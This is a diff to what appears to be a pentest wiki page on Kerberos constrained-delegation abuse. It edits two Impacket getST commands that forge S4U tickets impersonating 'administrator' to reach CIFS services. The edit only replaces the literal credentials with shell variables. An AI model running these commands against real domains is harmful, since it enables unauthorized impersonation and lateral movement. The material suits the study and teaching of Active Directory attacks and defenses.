@@ -101,7 +101,7 @@ The attacker can then proceed to a full S4U attack (S4U2self + S4U2proxy, a stan
 From UNIX-like systems, [Impacket](https://github.com/SecureAuthCorp/impacket)'s [getST](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) (Python) script can be used for that purpose.
 
 ```bash
-getST -spn "cifs/serviceA" -impersonate "administrator" "domain/serviceB:password"
+getST -spn "cifs/serviceA" -impersonate "administrator" "$DOMAIN/$SERVICE_B:$PASSWORD"
 ```
 
 
@@ -127,7 +127,7 @@ Once the ticket is obtained, it can be used in a S4U2proxy request, made by serv
 From UNIX-like systems, [Impacket](https://github.com/SecureAuthCorp/impacket)'s [getST](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) (Python) script can be used for that purpose.
 
 ```bash
-getST -spn "cifs/target" -impersonate "administrator" -additional-ticket "administrator.ccache" "domain/serviceA:password"
+getST -spn "cifs/target" -impersonate "administrator" -additional-ticket "administrator.ccache" "$DOMAIN/$SERVICE_A:$PASSWORD"
 ```
 
 
